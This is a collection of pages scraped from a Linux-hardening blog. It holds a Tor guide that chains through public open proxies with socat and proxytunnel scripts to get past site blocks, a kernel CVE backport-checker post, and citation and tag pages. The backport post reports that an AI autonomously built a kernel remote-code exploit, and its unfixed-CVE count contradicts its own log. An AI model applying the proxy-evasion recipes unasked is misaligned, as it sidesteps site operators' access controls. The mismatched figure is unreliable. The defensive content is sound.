8. “containers/oci-seccomp-bpf-hook,” GitHub Repository. [Online]. Available: [https://github.com/containers/oci-seccomp-bpf-hook](https://github.com/containers/oci-seccomp-bpf-hook) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:8)
9. V. Rothberg, “Improving Linux container security with seccomp,” Red Hat - Enable Sysadmin, June 15, 2020. Accessed: October 2, 2024. [Online]. Available: [https://www.redhat.com/sysadmin/container-security-seccomp](https://www.redhat.com/sysadmin/container-security-seccomp) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:9)
10. “mjson,” PyPI. [Online]. Available: [https://pypi.org/project/mjson/](https://pypi.org/project/mjson/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:10)
11. kernelmethod, “Allow rootless containers to use AppArmor profiles,” GitHub, March 11, 2022. Accessed: October 8, 2024. [Online]. Available: [https://github.com/containers/common/issues/958](https://github.com/containers/common/issues/958) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:11)
12. kernelmethod, “Allow rootless containers to use AppArmor profiles,” GitHub, March 12, 2022. Accessed: October 8, 2024. [Online]. Available: [https://github.com/containers/common/commit/55d217f7dd9ef4721cf32b32d0d8b8b029e877b3](https://github.com/containers/common/commit/55d217f7dd9ef4721cf32b32d0d8b8b029e877b3) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:12)
13. V. Rothberg, “Revert ‘Allow rootless containers to use AppArmor profiles’,” GitHub, March 18, 2022. Accessed: October 8, 2024. [Online]. Available: [https://github.com/containers/common/commit/d167b7f079029344ddbfc6218d16f5eb6932ccd7](https://github.com/containers/common/commit/d167b7f079029344ddbfc6218d16f5eb6932ccd7) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:13)
14. “Portal:SELinux/Setup,” openSUSE Wiki. Accessed: October 12, 2024. [Online]. Available: [https://en.opensuse.org/Portal:SELinux/Setup](https://en.opensuse.org/Portal:SELinux/Setup) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:14)
15. M Jahoda, B Ančincová, I. Gkioka, and T. Čapek, “Red Hat Enterprise Linux 7 SELinux User’s and Administrator’s Guide,” Red Hat Documentation, September 23, 2024. Accessed: October 10, 2024. [Online]. Available: [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/index](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/index) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:15)
16. “Portal:SELinux,” openSUSE Wiki. Accessed: October 12, 2024. [Online]. Available: [https://en.opensuse.org/Portal:SELinux](https://en.opensuse.org/Portal:SELinux) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:16)
17. D. Kasatkin and mzohar, “Integrity Measurement Architecture (IMA) Wiki,” SourceForge. Accessed: October 13, 2024. [Online]. Available: [https://sourceforge.net/p/linux-ima/wiki/Home/](https://sourceforge.net/p/linux-ima/wiki/Home/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:17)
18. Corbet, “The Integrity Measurement Architecture,” LWN.net, May 24, 2005. Accessed: October 13, 2024. [Online]. Available: [https://lwn.net/Articles/137306/](https://lwn.net/Articles/137306/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:18)
19. “About OP-TEE,” Github. [Online]. Available: [https://github.com/OP-TEE/optee_docs/blob/master/general/about.rst](https://github.com/OP-TEE/optee_docs/blob/master/general/about.rst) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:19)
20. J Son et al., “Quantitative analysis of measurement overhead for integrity verification,” in *SAC ‘17: Proceedings of the Symposium on Applied Computing,* 2017, pp.1528-1533, doi: 10.1145/3019612.3019738. [Online]. Available: [https://dl.acm.org/doi/10.1145/3019612.3019738](https://dl.acm.org/doi/10.1145/3019612.3019738) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:20)
21. “Keylime,” Keylime. [Online]. Available: [https://keylime.dev/](https://keylime.dev/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:21)
22. B. Schneier. “The Process of Security,” Schneier on Security, April, 2000. Accessed: October 13, 2024. [Online]. Available: [https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:22)

---

# How to access websites hostile toward Tor through Tor

`https://hardenedlinux.org/blog/2024-01-17-how-to-access-websites-hostile-toward-tor-through-tor`

# HardenedLinux

Therefore, to access these Tor-hostile websites, one approach is to route the traffic through a proxy server after exiting the Tor network. But how can we configure an additional proxy outside of the Tor exit relay?

By Anonymous


# How to access websites hostile toward Tor through Tor


Tor is an effective tool that allows us to access network services anonymously. Unfortunately, certain network services, often websites, have hostility towards Tor and employ various methods to block TCP connections originating from Tor exit nodes. However, they usually accept TCP connections that do not originate from Tor exits.


Therefore, to access these Tor-hostile websites, one approach is to route the traffic through a proxy server after exiting the Tor network. But how can we configure an additional proxy outside of the [Tor exit relay](https://www.skeptical-science.com/science/technology/heck-tor-exit-node/)?


## shadowsocks SIP003 extension


The [SIP003 plugin](https://shadowsocks.org/doc/sip003.html) is a program that accepts a series of environment variable parameters and is used to forward a remote TCP server to a local port. When using the SIP003 plugin with a shadowsocks client like ss-local(1), the plugin is executed as a subprocess after setting the environment variable parameters. It then accesses the remote shadowsocks server that has been forwarded to the local port by the SIP003 plugin.


As we know, Tor can function as a SOCKS4, SOCKS4a, SOCKS5, and an HTTP proxy server that supports only the CONNECT method (assuming Tor’s SOCKS proxy server listens on 127.0.0.1:9050, and the HTTP proxy server listens on 127.0.0.1:8118). By utilizing the functionality of these proxy servers to forward a remote TCP server to a local port, we can create a SIP003 plugin based on a proxy server. With this plugin, ss-local can connect to the shadowsocks server through Tor, effectively adding an additional proxy server outside of Tor’s exit. By setting ss-local as the SOCKS proxy server, we can access websites hostile towards Tor.


socat(1) is capable of forwarding a remote TCP server to a local port through a SOCKS4a proxy server. By encapsulating it in a shell script that conforms to the calling conventions of the SIP003 plugin, we can create a SIP003 plugin called sip003-socks.sh based on a SOCKS4a proxy server (the meanings of uppercase environment variables are explained in the referenced SIP003 specification):


```
#!/bin/sh
socks_host=$(echo ${SS_PLUGIN_OPTIONS} | cut -d: -f1)
socks_port=$(echo ${SS_PLUGIN_OPTIONS} | cut -d: -f2)
exec socat TCP-LISTEN:${SS_LOCAL_PORT},fork,bind=127.0.0.1 SOCKS4A:${socks_host}:${SS_REMOTE_HOST}:${SS_REMOTE_PORT},socksport=${socks_port}
```


The value of `${SS_PLUGIN_OPTIONS}` is obtained from the –plugin-opts option of the shadowsocks client, and it is used here to pass the location of the local SOCKS4a proxy server (i.e., Tor). For example, you can start ss-local with the following command line (assuming /path/to/sip003-http.sh has executable permissions):


`ss-local --plugin /path/to/sip003-socks.sh --plugin-opts 127.0.0.1:9050 ...`


socat forks subprocesses to handle incoming connections.


## Unauthenticated proxy server


In fact, when accessing websites that support HTTPS, adding an extra layer of encryption between the Tor exit and the extra proxy server may not provide significant benefits. Moreover, there are many unauthenticated SOCKS or HTTP proxies available through search engines. Therefore, we can simply forward such proxy servers to our local system using the methods mentioned earlier via Tor.


The proxy server is similar to that of a telephone operator. The caller first communicates with the operator, requesting assistance in connecting to the callee. Once the connection is established, the operator (proxy server) no longer participates in the communication but simply forwards the communication between the caller and the callee. Therefore, the caller can, within the constraints of the network topology, ask the first operator to help connect to the second operator and so on until the final operator connects to the callee.


One can use socat as mentioned earlier to achieve this, but its syntax can be complex and challenging to use without proper encapsulation. Here are some tools with simpler syntax:


For example, simpleproxy(1) is a straightforward TCP reverse proxy that does not directly support SOCKS proxy and has some limitations with HTTP proxy support. However, it can be forced to use a proxy server by injecting a dynamic library through tools like tsocks or proxychains using the LD_PRELOAD mechanism:


`proxychains simpleproxy -L ${local_port} -R ${remote_proxy_host}:${remote_proxy_port}`


However, a better tool for this scenario is proxytunnel(1), which explicitly supports HTTP proxies and even provides support for chaining two HTTP proxies. Its main purpose is to forward its standard input/output to remote server through one or two proxy servers. When used in conjunction with OpenSSH’s ProxyCommand option, it enables SSH to traverse through proxy server(s). However, using the -a or –standalone option of proxytunnel allows it to listen on a local port and forward the remote server through an HTTP proxy to the local system. It also forks subprocesses to handle incoming connections.


`proxytunnel -a ${local_port} -p 127.0.0.1:8118 -d ${remote_proxy_host}:${remote_proxy_port}`


Based on the chosen type of extra proxy server (HTTP or SOCKS), the client can then access Tor-hostile target websites through the forwarded extra proxy server by connecting to `127.0.0.1:${local_port}`, where `${local_port}` is the local port to which the traffic is forwarded.


If you prefer not to have these forwarders occupying the terminal, you can use daemon(1) to execute them as background processes.


Of course, proxytunnel can also be used to implement a SIP003 plugin, sip003-http.sh, which achieves forwarding through an HTTP proxy:


```
#!/bin/sh
exec proxytunnel -a ${SS_LOCAL_PORT} -p ${SS_PLUGIN_OPTIONS} -d ${SS_REMOTE_HOST}:${SS_REMOTE_PORT}
```


### To test the availability of an extra proxy server and identify malicious servers that may perform a man-in-the-middle attack


Proxy servers found through search engines may not always be reliable. Additionally, the author has discovered that some proxy servers provide untrustworthy certificates, indicating that these servers launch man-in-the-middle attacks on users. Therefore, it is crucial not to blindly trust proxy servers found through search engines and to test them thoroughly before using them.


Firstly, you can use a proxy-aware nc compatible tool to test whether these proxy servers can establish connections through Tor:


`nc.openbsd -zx 127.0.0.1:9050 ${remote_proxy_host} ${remote_proxy_port};echo $?`


If you are using ncat, you can use the following command line:


`ncat -z --proxy-type socks5 --proxy 127.0.0.1:9050 ${remote_proxy_host} ${remote_proxy_port};echo $?`


The command echo $? displays the return value of the previous command. When using nc -z, a return value of 0 indicates a successful connection, while a return value of 1 indicates a failure. Therefore, an output of 0 confirms that the proxy server can be connected through Tor.


Next, you can use the previously mentioned method to forward the proxy to ${local_port}, and then test it using curl assuming you have selected a SOCKS5 proxy server:


`curl -vx socks5h://127.0.0.1:${local_port} https://wtfismyip.com/json`


By using “socks5h” to specify the proxy server, the target host’s domain name will be passed to the proxy server. On the other hand, using “socks5” will resolve the domain name locally and pass the target host’s IP address to the proxy server.


If, after forwarding the proxy to the local system, you receive an untrusted certificate, whereas accessing the target directly through Tor gives you a trusted certificate, it indicates that the proxy is performing a man-in-the-middle attack. In such a case, it is advisable to refrain from using that proxy and choose an alternative option.

---

# backport

`https://hardenedlinux.org/tags/backport`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Closing the Kernel Backport Gap: Automated CVE Detection for the EU CRA (Cyber Resilience Act)](https://hardenedlinux.org/blog/2026-04-06-closing-the-kernel-backport-gap-automated-cve-detection-for-the-eu-cra-cyber-resilience-act/)


              Apr
              6

---

# rce

`https://hardenedlinux.org/tags/rce`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Stealthy RCE on Hardened Linux: noexec + Userland Execution PoC](https://hardenedlinux.org/blog/2026-04-13-stealthy-rce-on-hardened-linux-noexec--userland-execution-poc/)


              Apr
              13

---

# linux

`https://hardenedlinux.org/tags/linux`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Stealthy RCE on Hardened Linux: noexec + Userland Execution PoC](https://hardenedlinux.org/blog/2026-04-13-stealthy-rce-on-hardened-linux-noexec--userland-execution-poc/)


              Apr
              13


## 2026


# [Closing the Kernel Backport Gap: Automated CVE Detection for the EU CRA (Cyber Resilience Act)](https://hardenedlinux.org/blog/2026-04-06-closing-the-kernel-backport-gap-automated-cve-detection-for-the-eu-cra-cyber-resilience-act/)


              Apr
              6

---

# noexec

`https://hardenedlinux.org/tags/noexec`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Stealthy RCE on Hardened Linux: noexec + Userland Execution PoC](https://hardenedlinux.org/blog/2026-04-13-stealthy-rce-on-hardened-linux-noexec--userland-execution-poc/)


              Apr
              13

---

# mitigation

`https://hardenedlinux.org/tags/mitigation`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Closing the Kernel Backport Gap: Automated CVE Detection for the EU CRA (Cyber Resilience Act)](https://hardenedlinux.org/blog/2026-04-06-closing-the-kernel-backport-gap-automated-cve-detection-for-the-eu-cra-cyber-resilience-act/)


              Apr
              6


## 2025


# [The Path to Memory Safety is Inevitable](https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable/)


              May
              7

---

# CRA

`https://hardenedlinux.org/tags/cra`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Closing the Kernel Backport Gap: Automated CVE Detection for the EU CRA (Cyber Resilience Act)](https://hardenedlinux.org/blog/2026-04-06-closing-the-kernel-backport-gap-automated-cve-detection-for-the-eu-cra-cyber-resilience-act/)


              Apr
              6

---

# santizer

`https://hardenedlinux.org/tags/santizer`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2025


# [The Path to Memory Safety is Inevitable](https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable/)


              May
              7

---

# memory safety

`https://hardenedlinux.org/tags/memory-safety`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2025


# [The Path to Memory Safety is Inevitable](https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable/)


              May
              7

---

# fil-c

`https://hardenedlinux.org/tags/fil-c`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2025


# [The Path to Memory Safety is Inevitable](https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable/)


              May
              7

---

# fuzzer

`https://hardenedlinux.org/tags/fuzzer`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2025


# [The Path to Memory Safety is Inevitable](https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable/)


              May
              7

---

# container

`https://hardenedlinux.org/tags/container`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [Container Hardening Process](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process/)


              Oct
              13[apparmor](https://hardenedlinux.org/tags/apparmor)

---

# podman

`https://hardenedlinux.org/tags/podman`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [Container Hardening Process](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process/)


              Oct
              13[apparmor](https://hardenedlinux.org/tags/apparmor)

---

# apparmor

`https://hardenedlinux.org/tags/apparmor`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [Container Hardening Process](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process/)


              Oct
              13[apparmor](https://hardenedlinux.org/tags/apparmor)

---

# selinux

`https://hardenedlinux.org/tags/selinux`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [Container Hardening Process](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process/)


              Oct
              13[apparmor](https://hardenedlinux.org/tags/apparmor)

---

# tor

`https://hardenedlinux.org/tags/tor`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [How to access websites hostile toward Tor through Tor](https://hardenedlinux.org/blog/2024-01-17-how-to-access-websites-hostile-toward-tor-through-tor/)


              Jan
              17

---

# censorship

`https://hardenedlinux.org/tags/censorship`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [How to access websites hostile toward Tor through Tor](https://hardenedlinux.org/blog/2024-01-17-how-to-access-websites-hostile-toward-tor-through-tor/)


              Jan
              17

---

# Closing the Kernel Backport Gap: Automated CVE Detection for the EU CRA (Cyber Resilience Act)

`https://hardenedlinux.org/blog/2026-04-06-closing-the-kernel-backport-gap-automated-cve-detection-for-the-eu-cra-cyber-resilience-act`

# HardenedLinux

PT1 (EN 40000-1-2) – Principles for cyber resilience. A process-oriented “catch-all” standard ensuring products are developed and maintained using a risk-based approach, covering secure development lifecycles, threat modeling, and security testing.

by Shawn Chang


The EU Cyber Resilience Act (CRA) - Regulation (EU) 2024/2847 - entered into force on December 10, 2024. It is the EU’s first horizontal law that legally mandates secure-by-design for every “product with digital elements” placed on the European market. Manufacturers must now demonstrate compliance with a set of essential cybersecurity requirements throughout the entire product lifecycle, backed by enforceable penalties and market surveillance.


The CRA’s essential requirements are structured in two parts of Annex I, and are being translated into harmonized standards by three project teams under CEN-CENELEC:


- **PT1 (EN 40000-1-2)** – Principles for cyber resilience. A process-oriented “catch-all” standard ensuring products are developed and maintained using a risk-based approach, covering secure development lifecycles, threat modeling, and security testing.
- **PT2 (EN 40000-1-4)** – Generic security requirements. A product-oriented standard mapping the CRA’s 13 essential security requirements (Annex I, Part 1, points a–m) to a catalog of technical controls. These cover: shipping without known exploitable vulnerabilities (a), secure-by-default configuration (b), automatic security updates (c), access control and authentication (d), encryption of data at rest and in transit (e), integrity protection (f), data minimization (g), resilience and availability (h), limiting attack surfaces (i), exploitation mitigation mechanisms (k), security logging and monitoring (l), and secure data deletion (m).
- **PT3 (EN 40000-1-3)** – Vulnerability handling requirements. A process standard mapping to Annex I, Part 2, requiring manufacturers to identify and document vulnerabilities (including SBOM), remediate without delay, conduct regular security tests, publicly disclose fixed vulnerabilities, maintain a coordinated vulnerability disclosure policy, and distribute security updates free of charge and without delay.


The harmonized standards for PT1 and PT2 will make modern mitigations – CFI (PaX RAP, PAC/BTI, Intel CET), DFI (PaX KERNSEAL/AUTOSLAB, ARM MTE, VED), and capability-based approaches (CHERI, FIL-C) – the de facto baseline for compliance. But PT3 demands something harder: proper tracking of active exploits and potentially exploitable vulnerabilities across your entire product lifecycle.


For the Linux kernel, this is a problem that no one has solved at scale.


## The Problem: A Broken Chain


When a kernel vulnerability is discovered and fixed upstream, the fix doesn’t magically reach every device. It must travel through a long chain:


```
Upstream fix → Stable branch backports → Distribution backports → End users
```


At each step, backports can be partial, delayed, or missed entirely. Only a few GNU/Linux distro has full-time kernel maintainers while Only PaX/GRsecurity consistently provides high-quality backports across the board based on risk. Embedded vendors – automotive, industrial control systems, IoT devices built on Yocto/AOSP – are especially exposed. Many lack dedicated security teams, have no process for security audits or backport review, and simply don’t know which CVEs remain unfixed in their deployed kernels.


Meanwhile, the CVE flood continues. Since the Linux kernel became a CNA, the volume of assigned CVE numbers has grown dramatically, making manual tracking impractical.


## The Risk Model Has Changed


CVE-based risk analysis is no longer sufficient. The traditional approach — prioritizing fixes based on whether a public PoC or exploit exists — assumed that writing a working exploit required significant expertise and effort. AI (especially Claude Opus at the moment) has changed that equation. Large language models can now assist attackers in developing exploits for vulnerabilities that previously had no known proof-of-concept, dramatically lowering the barrier to weaponization. For the first time, an AI (Claude) has autonomously developed a state-of-the-art kernel RCE (CVE-2026-4747). It handled everything from offset discovery and gadget hunting to multi-packet BSS overwrites, ROP construction, thread hijacking, and even cleanup for a working reverse shell.


A CVE without a public exploit does not mean low risk. It means the exploit hasn’t been published yet. This may affect how CRA enforce of vulnerability handling in the future.


This is why the industry must shift from CVE-centric risk scoring to attack surface and exploit vector analysis. What matters is not whether someone has already written an exploit, but whether the vulnerable code path is reachable, what primitives it exposes, and what mitigations stand between an attacker and successful exploitation. This is exactly why the CRA’s PT2 emphasizes exploitation mitigation mechanisms (k) and limiting attack surfaces (i) — and why defense-in-depth matters more than ever.


## What We Built


[**Kernel Backport Checker**](https://github.com/hardenedlinux/kernel-backport-checker) is a command-line tool that answers a simple question: *which kernel CVEs are actually fixed in my kernel, and which are still open?*


It works by:


1. **Scanning NVD** for CVEs affecting your specific kernel version using CPE matching
2. **Filtering by .config** – if a vulnerable subsystem is disabled, the CVE is marked not applicable
3. **Extracting fix commits** from NVD references and git log (upstream + stable repos)
4. **Verifying fixes in source code** using a multi-phase algorithm: fingerprint matching, line-swap ordering detection, code-relocation detection, and context-aware adjacency checks
5. **Producing a CSV report** with verdicts: FIXED, LIKELY_FIXED, UNFIXED, INCONCLUSIVE, or NOT_APPLICABLE


The tool is conservative by design. Context-aware matching is used only to downgrade verdicts, never to upgrade them – because validation showed that context-based upgrades produced a 100% false positive rate. Small fixes with few distinctive lines are treated skeptically. Mixed signals across stable branches produce LIKELY_FIXED rather than FIXED.


## A Real-World Run


First, set up the data repositories:


```bash
./setup-repos.sh -a -d ../
```


Then run the checker:


```bash
./kernel-backport-checker.sh \
    -s ../linux-6.1.1 \
    -d ../linux \
    -b ../stable \
    -e ../kev-data/ \
    -f ../nvd-json-data-feeds \
    -k ../linux-6.1.1/.config \
    -o output
```


The tool walks through each phase:


```
========================================
 Kernel Backport Checker v3.2.0
========================================

[INFO] Configuration:
[INFO]   Kernel Source:   ../linux-6.1.1
[INFO]   Kernel Config:   ../linux-6.1.1/.config
[INFO]   Git Repository:  ../linux
[INFO]   Stable/Vendor:   ../stable/
[INFO]   KEV File:        ../kev-data//known_exploited_vulnerabilities.json
[INFO]   NVD Feeds:       ../nvd-json-data-feeds
[INFO]   Output:          output
[INFO]   Parallel Jobs:   8

[INFO] Detecting kernel version...
[INFO] Kernel version: 6.1.1
[INFO] Loading kernel config: ../linux-6.1.1/.config
[INFO] Loaded 8802 enabled CONFIG options
[INFO] Building CONFIG mapping from kernel Makefiles...
[INFO] Built CONFIG mapping: 18386 file mappings, 1646 directory mappings
[INFO] Using cached NVD scan: output/.nvd_kernel_cves_6.1.1.tsv
[INFO]   (Delete output/.nvd_kernel_cves_6.1.1.tsv to force rescan)
[INFO]   Cached: 4710 CVEs affecting kernel 6.1.1
[INFO] Using cached NVD fix refs: output/.nvd_fix_refs_6.1.1.tsv
[INFO]   Cached: fix refs for 4606 CVEs
[INFO] Building git hash index...
[INFO] Git hash index built: 1917126 commits
[INFO] Extracting backported CVE fixes from git...
[INFO] Searching stable/vendor repo for CVE mentions: ../stable/
[INFO] Found 4261 commit-CVE pairs (705 unique CVEs in git)
[INFO] Building CISA KEV index...
[INFO] KEV index built: 1554 CVEs
[INFO] Processing results...
[INFO]   Matching fix commits against git repos...
[INFO]   Found 26200 fix commits in git repos
[INFO]   Extracting changed files and diffs from fix commits (jobs=8)...
[INFO]   Exporting lookup tables for parallel processing...
[INFO]   Processing 4710 affected CVEs (jobs=8)...
[INFO]   Processing complete.
[INFO] Generating CSV report...
[INFO] ===========================================
[INFO] Report: output/backport-report.csv
[INFO] ===========================================
[INFO]
[INFO] Summary for kernel 6.1.1:
[INFO]   Total CVEs:              4710
[INFO]   Not applicable:          527
[INFO]   Applicable:              4183
[INFO]     Fixed via backport:    1
[INFO]     Likely fixed (review): 5
[INFO]     Unfixed (remaining):   3465
[INFO]     Inconclusive:          712
[INFO]
[INFO]   CVEs in CISA KEV:        9 (fixed: 0)
[INFO]
[INFO]   Severity (applicable / unfixed):
[INFO]     CRITICAL:              17 / 9
[INFO]     HIGH:                  1225 / 1006
[INFO]     MEDIUM:                2921 / 2432
[INFO]     LOW:                   20 / 18

[INFO] Done!
```


3,321 unfixed CVEs. Nine in CISA’s Known Exploited Vulnerabilities catalog – none fixed. That’s the visibility gap this tool addresses.


## No Source Code? No Problem


For scenarios where only a compiled kernel binary is available – firmware images, embedded devices, field-deployed systems – the companion **Binary Checker** performs CVE detection directly against vmlinux. It extracts kernel metadata, generates fix signatures from upstream git diffs, and matches them against the binary using string patterns, symbol changes, and optional function-level comparison via radare2.


## Validating the Verdict


For compliance purposes, you need confidence in the results. The tool includes four validation scripts:


- **validate-single-cve.sh** – tests a single CVE by attempting to apply the upstream fix patch. If the patch applies cleanly, the fix is not present (ground truth = UNFIXED).
- **validate-all.sh** – runs validation across all applicable CVEs in parallel, with filtering by verdict type
- **validate-with-patches.sh** – end-to-end test: applies fix patches to the source, re-runs the checker, verifies CVEs are now detected as FIXED or LIKELY_FIXED, then reverts
- **find-patchable-cves.sh** – finds UNFIXED CVEs whose patches can be cleanly applied, useful for building test sets


This methodology ensures verdicts are grounded in ground truth, not just heuristics.


## Getting Started


```bash
# Set up data repositories
./setup-repos.sh -a -d ../

# Run the checker
./kernel-backport-checker.sh \
    -s ../linux-6.1.1 \
    -d ../linux \
    -e ../kev-data/ \
    -f ../nvd-json-data-feeds \
    -k ../linux-6.1.1/.config \
    -o output

# Or use the binary checker (no source needed)
cd binary-checker
./kernel-binary-backport-checker.sh \
    -b /path/to/vmlinux \
    -d ../linux \
    -e ../kev-data/ \
    -f ../nvd-json-data-feeds \
    -o output
```


## Why This Matters Now


Mitigations alone are not enough. PT3 requires organizations to handle active exploits and potential vulnerabilities properly – to identify, document, remediate, and publicly disclose them. That starts with knowing what you’re exposed to.


Whether you’re a distro maintainer, an embedded vendor using Yocto/AOSP, or a security team auditing your infrastructure, Kernel Backport Checker gives you visibility into the one thing you can’t afford to be blind about: which kernel vulnerabilities are actually fixed in your deployment.


## Reference


**Kernel backport checkers** [https://github.com/hardenedlinux/kernel-backport-checker](https://github.com/hardenedlinux/kernel-backport-checker)


**Regulation (EU) 2024/2847** [https://eur-lex.europa.eu/eli/reg/2024/2847/oj/eng](https://eur-lex.europa.eu/eli/reg/2024/2847/oj/eng)


**EN 40000 norm series for the Cyber Resilience Act** [https://www1.secuvi.com/blog/compliance/en-40000-norm-series-for-the-cyber-resilience-act/](https://www1.secuvi.com/blog/compliance/en-40000-norm-series-for-the-cyber-resilience-act/)


**PaX RAP** [https://grsecurity.net/rap_faq](https://grsecurity.net/rap_faq)


**Enabling PAC and BTI on AArch64 for Linux** [https://developer.arm.com/community/arm-community-blogs/b/architectures-and-processors-blog/posts/enabling-pac-and-bti-on-aarch64](https://developer.arm.com/community/arm-community-blogs/b/architectures-and-processors-blog/posts/enabling-pac-and-bti-on-aarch64)


**VED 2026: after CFI - data only** [https://hardenedvault.net/blog/2025-09-17-dfi-security/](https://hardenedvault.net/blog/2025-09-17-dfi-security/)


**CHERI** [https://cheri-alliance.org/](https://cheri-alliance.org/)


**Fil-C** [https://fil-c.org/](https://fil-c.org/)


**MAD Bugs: Claude Wrote a Full FreeBSD Remote Kernel RCE with Root Shell (CVE-2026-4747)** [https://github.com/califio/publications/tree/main/MADBugs/CVE-2026-4747](https://github.com/califio/publications/tree/main/MADBugs/CVE-2026-4747)

---

# privacy

`https://hardenedlinux.org/tags/privacy`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [How to access websites hostile toward Tor through Tor](https://hardenedlinux.org/blog/2024-01-17-how-to-access-websites-hostile-toward-tor-through-tor/)


              Jan
              17

---

# Boot Unguarded: x86 Trust Anchor Downfalls to The Leaked OEM Internal Tools and Signing Keys

`https://hardenedlinux.org/blog/2023-09-07-boot-unguarded-x86-trust-anchor-downfalls-to-the-leaked-oem-internal-tools-and-signing-keys`

# HardenedLinux

Posted by HardenedLinux Sep 7, 2023 Tags: firmware BootGuard UEFI

By HardcoreMatrix


The HardcoreMatrix team specializes in firmware and infrastructure security, supply chain security, and threat modeling. We vividly illustrate the severe consequences that underlying threats pose to enterprise and personal information security.


![Bootjail0](https://hardenedlinux.org/images/bootjail/bootjail0.jpg)


## One “Leak” can rule them all!


In March 2023, Micro-Star International (MSI) suffered a [significant attack](https://www.bleepingcomputer.com/news/security/money-message-ransomware-gang-claims-msi-breach-demands-4-million/) orchestrated by the Money Message ransomware group. Unfortunately, this is not just [another random leak](https://hardenedvault.net/blog/2022-10-08-alderlake_fw-leak/). The [aftermath revealed](https://arstechnica.com/information-technology/2023/05/leak-of-msi-uefi-signing-keys-stokes-concerns-of-doomsday-supply-chain-attack/) a leak of internal data, including highly sensitive information such as the BootGuard private key. This key, integral to Intel’s hardware trust and cryptographic key management system, signifies an exploit vector can’t be fixed easily, allowing for bypassing of the primary security mechanism in specific device models. Additionally, the leaked data also exposed the UEFI firmware image signing key, further exacerbating the severity of the breach.


## Why BootGuard matters to UEFI/x86 ecosystem


The BootGuard security mechanism, alongside CPU Microcode and [CSME](https://hardenedvault.net/blog/2021-07-16-ciso-seceng_csme/), forms the foundation of Intel’s core security mechanisms. It serves as a critical integrity protection mechanism rooted in the hardware trust system, while the UEFI firmware acts as a vital low-level software component within the computer system. The compromise of BootGuard, whether through successful attacks via vulnerability (e.g: [CVE-2020-8705](https://trmm.net/Sleep_attack/)) or acquisition of the private key from OEM/ODM manufacturers, enables threat actors to exploit UEFI implementation flaws, configuration errors, and other vulnerabilities to achieve bypass numerous established security measures and mitigations, e.g: SMM_BWP, BWE/BLE, PRx hardware security mechanisms, SecureBoot and kernel security mitigation technologies such as HCVI, PatchGuard, kASLR, KDEP, SMEP, SMAP. Furthermore, mainstream antivirus software and EDR/XDR systems become ineffective, granting attackers persistent control over the compromised device.


